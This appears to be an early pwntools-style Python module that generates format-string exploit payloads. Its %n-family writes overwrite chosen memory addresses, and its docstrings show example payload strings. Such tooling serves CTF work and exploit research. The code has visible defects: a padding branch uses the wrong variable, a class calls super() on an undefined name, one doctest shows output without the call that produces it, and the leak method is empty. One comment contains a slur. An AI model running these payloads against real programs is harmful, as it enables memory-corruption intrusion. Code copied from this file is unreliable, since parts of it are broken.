# -*- coding: utf-8 -*-
import collections
import os

from pwnlib.context import context
from pwnlib.util.iters import group
from pwnlib.abi import ABI
from pwnlib.log import getLogger
from pwnlib.tubes.process import process
from pwnlib.util.packing import unpack
from pwnlib.util.packing import flat

log = getLogger(__name__)

write_size_max = {
    1: len("%255c"),
    2: len("%65535c"),
    4: len("%4294967295c"),
}

write_size_deltas = {
    1: write_size_max[1],
    2: write_size_max[2] - write_size_max[1],
    4: write_size_max[4] - write_size_max[2],
}


write_strings = {
    1: '%hhn',
    2: '%hn',
    4: '%n'
}


write_strings_positional = {
    1: '%@$hhn',
    2: '%@$hn',
    4: '%@$n'
}

write = collections.namedtuple("write", ("address", "data"))

class FormatFunction(object):
    """Encapsulates data about a function which takes a format string.
    """
    registry = {}

    def __init__(self, index, name=None):
        #: Argument index of the format string
        self.format_index = index
        self.name = name

        if name:
            FormatFunction.registry.setdefault(name, self)

    @property
    def stack_index(self):
        """The dollar-argument index for the top of the stack.

        This varies by function, depending on the architecture.
        """
        register_arguments = ABI.default().register_arguments

        # If there are *no* register arguments, like for i386,
        # the index of the first value on the stack is increased
        # by one, because glibc is retarded.
        format_index = self.format_index

        if register_arguments:
            format_index += len(register_arguments)

        return max(0, format_index)

    def __repr__(self):
        return '%s(%r, %r)' % (self.__class__.__name__,
                               self.format_index,
                               self.name)

# First argument
printf   = FormatFunction(0, 'printf')
scanf    = FormatFunction(0, 'scanf')

# Second argument
dprintf  = FormatFunction(1, 'dprintf')
sprintf  = FormatFunction(1, 'sprintf')
fprintf  = FormatFunction(1, 'fprintf')
asprintf = FormatFunction(1, 'asprintf')
fscanf   = FormatFunction(1, 'fscanf')
sscanf   = FormatFunction(1, 'sscanf')

# Third argument
snprintf = FormatFunction(2, 'snprintf')

class FormatString(object):
    def __init__(self,
                 stack_buffer_offset,
                 stack_buffer_size,
                 already_written=0,
                 write_size=2,
                 format_buffer_size=0,
                 function=printf,
                 padding='\x00'):
        """Initialize a FormatString object.

        Arguments:
            stack_buffer_offset(int): Offset (in bytes) to the region(s)
                of controlled data on the stack.  The offset is calculated from
                immediately after the return address (e.g. where printf returns
                to).
            stack_buffer_size(int): Size (in bytes) of the buffer described by
                ``stack_buffer_offset``.
            already_written(int): Number of bytes which have already been written
                before our format string is used.  For the common case of
                ``printf(buffer)``, the default value of ``0`` is correct.
                However, if our format string gets concatenated to some other
                data, this value should be set to the number of bytes printed
                before our format string is evaluated.
            write_size(int): Maximum number of bytes to write at a time.
            format_buffer_size(int): Size (in byts) of the format string buffer.
                Only set this if the format string buffer is not on the stack,
                or not contiguous with the described via ``stack_buffer_offset``.
            function(FormatFunction, str): Format function which is invoked.
                Can be either a function name (e.g. ``"snprintf"``) or an
                instance of :class:`FormatFunction`.  The default value is
                ``printf``.
            padding(str): Byte to use for padding

        Note:

            The easiest way to calculate ``stack_buffer_offset`` is to set a
            breakpoint at the e.g. ``call printf`` instruction, and calculate
            the difference between the stack pointer and the address of the
            buffer on the stack.

            Pwndbg_ makes this relatively easy, since it prints out the arguments
            passed into functions.   Let's assume that the buffer
            contents are "aaaabaaa" as is generated via :func:`cyclic`.

            ::

                > 0x8048b03 <main+726>    call   printf@plt
                format: 0xffffcbb4 ◂— 'aaaabaaa'
                ...
                pwndbg> distance $esp 0xffffcbb4
                0xffffcb20->0xffffcbb4 is 0x94 bytes (0x25 words)


            If you are unaware of where your buffer lies, you can use the
            ``search`` command to find it easily.

            ::

                pwndbg> search aaaabaaa
                [heap]          0x804a168 'aaaabaaacaaadaa...'
                [stack]         0xffffcb96 'aaaabaaacaaadaa...'
                [stack]         0xffffcbb4 'aaaabaaa'

        Tests:

            >>> f = FormatString(0x94, 100)

            By default, an empty format string is returned.

            >>> f.payload()
            ''

            If some memory is set, the payload changes accordingly.

            >>> f[0xdeadbeef] = 'A'
            >>> f.payload()
            '%65c%07$hhnX\xef\xbe\xad\xde'

            Memory sizing is determined automatically (note ``hhn`` vs ``hn``)

            >>> f[0xdeadbeef] = 'AA'
            >>> f.payload()
            '%16705c%08$hnXXX\xf0\xbe\xad\xde'

            Multiple writes are supported, and positional indices are collapsed.

            >>> f[0xcafebabe] = 'AB'
            '%16705c%10$hn%256c%hnXXX\xf0\xbe\xad\xde\xbf\xba\xfe\xca'

            Repeated values are optimized and collapsed.

            >>> f[0xcafebabe] = 'AA'
            >>> f.payload()
            '%16705c%08$hn%hn\xf0\xbe\xad\xde\xbf\xba\xfe\xca'

            Integers and addresses can be used instead of strings, as well.

            >>> f[0xdecafbad] = 0x41414141
            >>> f.payload()
            '%16705c%09$hn%hn%hnX\xf0\xbe\xad\xde\xb0\xfb\xca\xde\xbf\xba\xfe\xca'
        """

        # Determine our calling convention / dollar-argument model
        if isinstance(function, str):
            function = FormatFunction.registry.get(function, None)

        elif not function:
            function = printf

        #: Target function which is invkoed
        self.function = function

        #: Number of bytes already written
        self.already_written = already_written

        #: Whether the format string buffer itself is on the stack
        self.stack_buffer_offset = stack_buffer_offset

        #: Size of the buffer on the stack
        self.stack_buffer_size = stack_buffer_size

        #: Size of the format string buffer
        self.format_buffer_size = format_buffer_size

        #: Size of writes
        self.write_size = write_size

        #: Operand stack, of what is being performed
        self.memory = {}

        self._dirty = True
        self._format_string = None
        self._stack_data = None
        self._writes = None

        nargs = len(ABI.default().register_arguments)
        log.info_once("Format strings skip %i register arguments" % nargs)


    @property
    def format_index(self):
        return self.function.format_index

    @property
    def stack_index(self):
        return self.function.stack_index

    @classmethod
    def from_corefile(clazz, corefile, stack_data, format_string=''):
        """from_corefile(corefile) -> FormatString

        Given a corefile, extract all of the relevant data for
        format-string exploitation.

        The program state from the corefile must be set up such that:

        1. The process is stopped at the first instruction of the print
           function.
        2. The stack buffer we control is filled with the data ``stack_data``.
        3. The format string, if separate from the stack buffer, is filled with
           the data ``format_string``.

        The available buffer sizes are inferred directly from the provided
        parameters.

        Arguments:
            corefile(Corefile): :class:`Corefile` object to process
            stack_data(str): Controlled data on the stack.  The length
                of this string is used to determine the stack buffer size.
                The contents of this string are used to search the corefile,
                to determine stack offsets.
            format_string(str): Controlled format string, if not on the
                stack as part of stack_data.  Only the length of this string
                is used.

        Returns:

            :class:`Corefile`: A corefile object
        """
        stack_pointer = corefile.sp

        # The data that the user gave us may not actually appear anywhere
        # in the process, because it may have been truncated by e.g. fgets()
        length = 0
        address = 0
        while True:
            # The data must be on the stack, and at a higher address than sp
            for match in sorted(corefile.search(stack_data[:length])):
                if match > stack_pointer:
                    address = match
                    break
            else:
                break

            if length == len(stack_data):
                break

            length += 1

        if not address or length == 0 or length < len(stack_data) / 2:
            log.error("Could not find a suitable stack address")

        offset = address - stack_pointer
        message = "Found {length:#x} bytes of data on stack = {address:#x}\n" \
                + "Stack pointer @ {stack_pointer:#x}\n" \
                + "Offset in bytes = {offset:#x}"

        log.info(message.format(**locals()))

        return FormatString(stack_buffer_offset = offset,
                            stack_buffer_size = length,
                            format_buffer_size = len(format_string))


    # ----- WRITE RELATED FUNCTIONS -----
    def __contains__(self, index):
        return index in self.memory

    def __getitem__(self, index):
        return self.memory.get(index, None)

    def __setitem__(self, index, value):
        self._dirty = True

        for i, byte in enumerate(flat(value)):
            self.memory[index + i] = byte


    # ----- READ RELATED FUNCTIONS -----
    def leak(self, address):
        pass

    # ----- FORMAT STRING CREATION -----
    @property
    def format_string(self):
        self._generate()

        if self.format_buffer_size:
            return self._format_string

        return self._format_string + self._stack_data

    @property
    def stack_data(self):
        self._generate()
        return self._stack_data

    @property
    def writes(self):
        self._generate()
        return self._writes

    def _generate(self):
        """_generate(size=1) -> str

        Generate the format string.
        """
        if not self._dirty:
            return

        # Coalesce writes into chunks of write_size or smaller
        write_sizes = []
        while 1 not in write_sizes:
            write_sizes.append(self.write_size >> len(write_sizes))

        # Store the coalesced data in a new copy of memory
        memory = self.memory.copy()

        # Find repeated chunks of memory, which we can optimize
        # to not emit twice.
        # contiguous_memory = self.memory.copy()
        # for address, byte in sorted(contiguous_memory.viewitems()):
        #     run_size = 1
        #     data = byte
        #     while address + run_size in contiguous_memory:
        #         contiguous_memory[address] += memory[address + run_size]
        #         del contiguous_memory[address + run_size]
        #         run_size += 1

        # Create a frequency-ordered list of all memory chunks.
        # Keys are the data, values are a list of addresses.
        # The frequency of a sequence of bytes is len(freq[data])
        #
        # Note: We do not attempt to optimize single-byte writes.
        #
        # Consider that we might want to write the value
        #
        #       0x63616261 ("abac")
        #
        # If we frequency-optimize single-byte writes, we'll
        # end up with four one-byte writes (since "a" is duplicated)
        # instead of two one-byte writes.
        #
        # The benefit of doing this frequency analysis is that naive
        # 2-byte chunking might perform a write like:
        #
        #       "ab" "bb" "b"
        #
        # However, the frequency analysis would allow us to perform:
        #
        #       "a" "bb" "bb"
        #
        # Which uses the same amount of space for *pointers*, but
        # uses significantly less space for the format string itself,
        # by re-using values.
        freq_memory = collections.defaultdict(lambda: [])

        for size in write_sizes:

            if size == 1:
                continue

            for address, byte in memory.viewitems():

                span = tuple(range(address, address+size))
                if not all(a in memory for a in span):
                    continue

                chunk = ''.join(memory[a] for a in span)
                freq_memory[chunk].append(address)

        # Optimize against frequency, starting with the most frequent
        def count(chunk_addresses):
            chunk, addresses = chunk_addresses
            return len(addresses)

        for chunk, addresses in sorted(freq_memory.items(), key=count):

            for address in addresses:
                # Did we already optimize this chunk?
                span = tuple(range(address, address+len(chunk)))

                if not all(a in memory for a in span):
                    continue

                # We did not already optimize it out, do so now
                for a in span:
                    del memory[a]

                memory[address] = chunk

        # Memory is now in an optimal state for size.
        # Convert to integer values, instead of byte-strings.
        #
        # Subtract the number of bytes 'already written', and
        # make the value unsigned.
        int_memory = {}

        for addr, data in memory.items():
            size = len(data)
            mask = (1 << (8*size)) - 1

            value = unpack(data, bytes=size)

            value += self.already_written
            value &= mask

            int_memory[addr] = value

        # Order writes such that we maximally use the increasing
        # counter of the print function, given the number of bytes
        # which have already been printed.
        def value_order(k_v):
            k,v = k_v
            return v

        ordered_writes = []

        for addr, value in sorted(int_memory.items(), key=value_order):
            ordered_writes.append(write(addr, value))

        # We have now optimized and ordered our writes
        #
        # If our format string is in the same buffer as the stack buffer
        # we are using to store our pointers, we need to calculate its size.
        format_strings = []
        stack_buffer = []
        counter = self.already_written

        for addr, value in ordered_writes:
            size = len(memory[addr])
            fmt = ''

            # If we need to adjust the value which will be written, do it
            delta = value - counter

            if delta > 3:
                fmt += '%{}c'.format(value-counter)
            elif delta > 0:
                fmt += ' ' * counter

            counter = value

            # Actually write the value
            fmt += write_strings_positional[size]

            # Save both
            format_strings.append(fmt)
            stack_buffer.append(addr)

        # Loop until we get the right sizes, after adjustment
        num_positions = len(format_strings)

        # A copy of the format string with '@' for placeholders
        format_string_raw = ''.join(format_strings)

        # How many extra bytes do the actual positionals incur?
        extra = 0

        # Save off the original stack_buffer data
        stack_buffer_raw = list(stack_buffer)

        while True:
            # Restore everything to its original values
            format_string = str(format_string_raw)
            stack_buffer = list(stack_buffer_raw)

            # Get temporary / local copies of the sizes
            format_buffer_size = self.format_buffer_size
            stack_buffer_size = self.stack_buffer_size
            stack_buffer_offset = self.stack_buffer_offset

            # If the format buffer is "included" in the stack buffer, make adjustments
            if not format_buffer_size:
                fmt_len = len(format_string) + extra

                # Set the format buffer size to be the size of the overall buffer
                format_buffer_size = min(fmt_len, stack_buffer_size)

                # Adjust the amount of remaining data
                stack_buffer_size -= fmt_len
                stack_buffer_offset += fmt_len

            # Adjust the stack buffer to be 4-byte aligned
            while stack_buffer_offset % context.bytes:
                stack_buffer.insert(0, '\x00')
                stack_buffer_offset += 1

            # Calculate the offset for the positional argument
            stack_buffer_index = self.stack_index + self.format_index
            stack_buffer_index += (stack_buffer_offset // context.bytes)

            # Calculate the positional arguments.  They are represented by '@' symbols.
            num_positions = format_string.count('@')

            # Calculate the highest positional value
            stack_buffer_index_max = stack_buffer_index + num_positions

            # The total amount of space which the positional specifiers use up
            positionals = ''.join(map(str, range(stack_buffer_index, stack_buffer_index_max)))
            positional_width = len(positionals)

            # We already account for the single character per positional with
            # the embedded '@'
            positional_width_extra = positional_width - num_positions

            # How much "extra" we need
            if extra != positional_width_extra:
                extra = positional_width_extra
                continue

            # We were correct!  Perform the replacements
            while '@' in format_string:
                format_string = format_string.replace('@', str(stack_buffer_index), 1)
                stack_buffer_index += 1

            # Double check that we were correct
            assert len(format_string) == len(format_string_raw) + extra
            break

        # Get our format string and stack data! Woot!
        stack_data = flat(stack_buffer)

        # Perform final size checks
        if format_buffer_size < len(format_string):
            log.error("Cannot fit the format string in %i bytes. (need %r %r)"
                        % (format_buffer_size, len(format_string), (format_string)))

        if stack_buffer_size < len(stack_data):
            log.error("Cannot fit the stack data in %i bytes.  Need %i.\n"
                        % (stack_buffer_size, len(stack_data)))

        self._format_string = format_string
        self._stack_data = stack_data
        self._writes = ordered_writes
        self._dirty = False

    def dump(self):
        rv = []
        for write in self.writes:
            rv.append('%#x => %r' % (write.address, write.data))
        return '\n'.join(rv)


class AutomaticDiscoveryProcess(process):
    def __init__(self, argv, remote=True, size=None, **kw):
        """Object for automatic discovery of format string parameters.

        Arguments:
            argv(list): List of arguments.  See ``process``.
            remote(bool): Whether the target process is remote or
            size(int): Size of format string buffer.
                If unbounded and no crashes will occur with large sizes, use ``None``.
                Otherwise, enter the largest size which does not cause a crash.
            kwargs: Additional arguments to ``process``.
        """
        self._format_size = size
        super(AutomaticDiscovery, self).__init__(argv, **kw)

    def submit(self, format_string):
        """subit(format_string) -> str

        Submit a format string to the target binary, and return its output.
        Must only return bytes printed by the format function.

        Arguments:
            format_string(str): Complete format string to submit.

        Returns:
            String printed by the function, or ``None``.
        """
        raise NotImplementedError('Must subclass and implement submit')

